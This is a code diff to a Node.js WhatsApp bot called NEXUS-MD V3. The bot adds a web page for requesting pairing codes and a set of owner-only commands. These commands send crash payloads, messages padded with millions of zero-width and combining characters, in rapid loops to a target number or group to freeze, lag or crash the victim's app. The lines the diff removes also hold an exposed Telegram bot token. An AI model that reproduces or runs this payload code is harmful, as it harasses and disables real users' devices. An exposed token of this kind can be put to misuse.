@@ -7,27 +7,58 @@ const {
     Browsers,
     makeCacheableSignalKeyStore
 } = require("@whiskeysockets/baileys");
-const TelegramBot = require('node-telegram-bot-api');
 const pino = require('pino');
 const express = require('express');
 
-// --- ⚙️ CONFIGURATION ---
-const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
-const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
 const app = express();
 const PORT = process.env.PORT || 3000;
 const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";
 const AD_IMAGE_URL = "https://telegra.ph/file/a8a183d25667e41793741.jpg";
 
 let botConfig = {
-    botName: "NEXUS-MD V3 3M SUPREME",
-    owner: "94767475809", 
+    botName: "NEXUS-MD V3 SUPREME",
+    owner: "94767475809", // Your Number
     prefix: ".",
 };
 
-app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
-app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));
+// --- 🌐 SUPREME WEB PAIRING UI ---
+app.get('/', (req, res) => {
+    res.send(`
+        <html>
+            <head>
+                <title>NEXUS V3 WEB</title>
+                <style>
+                    body { background: radial-gradient(circle, #050505 0%, #000 100%); color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
+                    .box { border: 1px solid #0f0; padding: 40px; display: inline-block; box-shadow: 0 0 25px #0f0; background: rgba(0,255,0,0.02); border-radius: 5px; }
+                    input { padding: 15px; width: 300px; background: #000; border: 1px solid #0f0; color: #0f0; font-size: 18px; outline: none; margin-bottom: 20px; }
+                    button { padding: 15px 30px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold; font-size: 16px; text-transform: uppercase; }
+                    button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
+                    #res { font-size: 40px; margin-top: 30px; color: #ff0055; font-weight: bold; text-shadow: 0 0 10px #ff0055; letter-spacing: 5px; }
+                </style>
+            </head>
+            <body>
+                <div class="box">
+                    <h1>☣️ NEXUS SUPREME WEB ☣️</h1>
+                    <p>ENTER NUMBER WITH 94 CODE</p>
+                    <input type="text" id="num" placeholder="947xxxxxxxx"><br>
+                    <button onclick="g()">GET PAIRING CODE</button>
+                    <div id="res"></div>
+                </div>
+                <script>
+                    async function g() {
+                        const n = document.getElementById('num').value;
+                        document.getElementById('res').innerText = "GENERATING...";
+                        const r = await fetch('/code?num=' + n);
+                        const d = await r.json();
+                        document.getElementById('res').innerText = d.code || "FAILED!";
+                    }
+                </script>
+            </body>
+        </html>
+    `);
+});
 
+// --- ⚙️ BOT CORE ---
 async function startNexus() {
     const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
     const { version } = await fetchLatestBaileysVersion();
@@ -39,35 +70,34 @@ async function startNexus() {
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
         logger: pino({ level: 'silent' }),
-        browser: ["Ubuntu", "Chrome", "110.0.5481.178"], 
-        printQRInTerminal: false,
+        browser: Browsers.macOS("Desktop"),
         syncFullHistory: false
     });
 
-    // --- 🤖 TELEGRAM PAIRING ---
-    tgBot.on('message', async (msg) => {
-        const text = msg.text;
-        const chatId = msg.chat.id;
-        if (text === '/start') {
-            return tgBot.sendMessage(chatId, "☠️ *NEXUS-MD V3 3M SUPREME*\n\nEnter your WhatsApp number with 94 code.", { parse_mode: 'Markdown' });
-        }
-        if (text && /^\d+$/.test(text) && text.length > 9) {
-            try {
-                tgBot.sendMessage(chatId, "⏳ *Connecting...*");
-                await delay(2000);
-                let code = await sock.requestPairingCode(text.trim());
-                tgBot.sendMessage(chatId, `🔥 *PAIRING KEY:* \`${code}\``, { parse_mode: 'Markdown' });
-            } catch (e) { tgBot.sendMessage(chatId, "❌ Error!"); }
-        }
+    app.get('/code', async (req, res) => {
+        let num = req.query.num;
+        try {
+            let code = await sock.requestPairingCode(num.trim());
+            res.json({ code: code });
+        } catch (e) { res.json({ error: "Fail" }); }
     });
+
+    app.listen(PORT, () => console.log(`Server Online: ${PORT}`));
+
+    // --- 💀 BUG PAYLOADS (3,000,000+ POWER) ---
+    const p_kill = "☠️ *WHITE SCREEN KILLER* ☠️\n" + "​".repeat(2500000);
+    const p_crash = "🔥 *SYSTEM LAGGER* 🔥\n" + "҉".repeat(600000) + "ꦿ".repeat(600000);
+    const p_destroy = "💀 *MEMORY OVERFLOW* 💀\n" + "⚰️".repeat(400000) + "᥋".repeat(800000);
+    const p_freeze = "❄️ *UI FREEZER* ❄️\n" + "​".repeat(1500000) + "ꦿ".repeat(900000);
+    const p_the_end = "🌌 *FINAL DESTRUCTION* 🌌\n" + "​".repeat(2000000) + "ꦿ".repeat(1000000) + "🔥".repeat(500000);
 
     // --- 📩 MESSAGE HANDLER ---
     sock.ev.on('messages.upsert', async (chatUpdate) => {
         try {
             const mek = chatUpdate.messages[0];
-            if (!mek.message) return;
+            if (!mek.message || mek.key.fromMe) return;
             const from = mek.key.remoteJid;
-            const isOwner = mek.key.fromMe || from.startsWith(botConfig.owner);
+            const isOwner = from.startsWith(botConfig.owner);
             if (!isOwner) return; 
 
             const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
@@ -78,78 +108,68 @@ async function startNexus() {
             const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
             const targetJid = targetNum + "@s.whatsapp.net";
 
-            // 🔥 3M SUPREME PAYLOAD
-            const deadlyBug = "☠️ *NEXUS 3M SUPREME* ☠️\n" + "​".repeat(1000000) + "ꦿ".repeat(400000);
-
             switch (command) {
                 case 'menu':
-                case 'bug':
-                    const gammataMenu = `
-┏━━━━━━━━━━━━━━━━━━━━┓
-┃  ☣️ *NEXUS-MD V3 SUPREME* ☣️
-┗━━━━━━━━━━━━━━━━━━━━┛
+                    const heavyMenu = `
+╭━━━━━━━━━━━━━━━━━━━━━━╮
+┃  ☣️ *NEXUS-MD V3 ELITE* ☣️  ┃
+╰━━━━━━━━━━━━━━━━━━━━━━╯
 ┃
-┃ 🩸 *NATURE:* _Global Destroyer_
-┃ 🦠 *POWER:* \`3,000,000+\` Characters
-┃ ⚡ *STATUS:* _Master Private Online_
+┃ 🩸 *POWER:* \`3,000,000+\`
+┃ ⚡ *TYPE:* _System Destroyer_
 ┃ 💻 *DEV:* _Sasiya MD_
 ┃
-┣━━━━━━━━━━━━━━━━━━━━┓
-┃  🔥 *S U P R E M E  B U G S*
-┣━━━━━━━━━━━━━━━━━━━━┛
+┣━━━━━━━━━━━━━━━━━━━━━━╮
+┃  🔥 *K I L L E R  M O D E S*
+┣━━━━━━━━━━━━━━━━━━━━━━╯
+┃ 
+┃ ☠️ *.kill* [num] - _White Screen_
+┃ 🔥 *.crash* [num] - _System Lag_
+┃ 💀 *.destroy* [num] - _RAM Overflow_
+┃ ❄️ *.freeze* [num] - _UI Lock_
+┃ 🌀 *.wipe* [jid] - _Group Death_
+┃ 🌌 *.the_end* [num] - _Final Crash_
 ┃
-┃ ☠️ *.vid_crash* [num]
-┃ 🔥 *.ios_dead* [num]
-┃ 💀 *.kill* [num]
-┃ ❄️ *.freeze* [num]
-┃ 🌀 *.group* [jid]
-┃ 🌌 *.the_end* [num]
-┃
-┣━━━━━━━━━━━━━━━━━━━━┓
-┃  🛡️ *D E V E L O P E R  N E X U S*
-┗━━━━━━━━━━━━━━━━━━━━┛`;
-
-                    await sock.sendMessage(from, { 
-                        text: gammataMenu,
-                        contextInfo: { 
-                            externalAdReply: { 
-                                title: "NEXUS-MD 3M MENU ACTIVE ⚡",
-                                body: "Supreme Bug Destroyer Ready 💀",
-                                mediaType: 1,
-                                thumbnailUrl: AD_IMAGE_URL, 
-                                sourceUrl: CHANNEL_URL
-                            }
-                        }
-                    }, { quoted: mek });
+╰━━━━━━━━━━━━━━━━━━━━━━╯`;
+                    await sock.sendMessage(from, { text: heavyMenu }, { quoted: mek });
                     break;
 
-                // --- ALL BUG COMMANDS ---
                 case 'kill':
-                case 'vid_crash':
-                case 'ios_dead':
-                case 'freeze':
-                case 'the_end':
-                    if (!targetNum) return sock.sendMessage(from, { text: "❌ Number එකක් දීපන් මචං!" });
-                    
-                    await sock.sendMessage(from, { text: `🌑 *DEPLOYING:* ${command.toUpperCase()}\n🎯 *TARGET:* ${targetNum}` });
-
-                    for(let i=0; i<10; i++) {
-                        await sock.sendMessage(targetJid, { text: deadlyBug });
-                        await delay(300);
-                    }
-
-                    // Success Report
-                    const report = `╭───〔 *ATTACK REPORT* 〕───┈\n│\n│ ✅ *STATUS:* SUCCESS\n│ 🎯 *TARGET:* ${targetNum}\n│ 🦠 *MODE:* ${command}\n│ 🕒 *TIME:* ${new Date().toLocaleTimeString()}\n╰─────────────┈`;
-                    await sock.sendMessage(from, { text: report }, { quoted: mek });
+                    if (!targetNum) return;
+                    await sock.sendMessage(from, { text: "⚪ *SENDING WHITE SCREEN BUG...*" });
+                    for(let i=0; i<15; i++) { await sock.sendMessage(targetJid, { text: p_kill }); await delay(200); }
                     break;
 
-                case 'group':
-                    if (!args[0]) return;
-                    await sock.sendMessage(from, { text: "🌀 *WIPING GROUP...*" });
-                    for(let i=0; i<10; i++) {
-                        await sock.sendMessage(args[0], { text: deadlyBug });
-                        await delay(300);
-                    }
+                case 'crash':
+                    if (!targetNum) return;
+                    await sock.sendMessage(from, { text: "🔥 *DEPLOYING SYSTEM LAGGER...*" });
+                    for(let i=0; i<15; i++) { await sock.sendMessage(targetJid, { text: p_crash }); await delay(200); }
+                    break;
+
+                case 'destroy':
+                    if (!targetNum) return;
+                    await sock.sendMessage(from, { text: "💀 *INITIATING RAM OVERFLOW...*" });
+                    for(let i=0; i<20; i++) { await sock.sendMessage(targetJid, { text: p_destroy }); await delay(150); }
+                    break;
+
+                case 'freeze':
+                    if (!targetNum) return;
+                    await sock.sendMessage(from, { text: "❄️ *LOCKING TARGET UI...*" });
+                    for(let i=0; i<15; i++) { await sock.sendMessage(targetJid, { text: p_freeze }); await delay(200); }
+                    break;
+
+                case 'wipe':
+                    const gJid = args[0];
+                    if (!gJid) return;
+                    await sock.sendMessage(from, { text: "🌀 *WIPING GROUP DATA...*" });
+                    for(let i=0; i<25; i++) { await sock.sendMessage(gJid, { text: p_the_end }); await delay(300); }
+                    break;
+
+                case 'the_end':
+                    if (!targetNum) return;
+                    await sock.sendMessage(from, { text: "🌌 *EXECUTING FINAL DESTRUCTION...*" });
+                    for(let i=0; i<30; i++) { await sock.sendMessage(targetJid, { text: p_the_end }); await delay(100); }
+                    await sock.sendMessage(from, { text: "✅ *TARGET IS DEAD.*" });
                     break;
             }
         } catch (e) { console.log(e); }
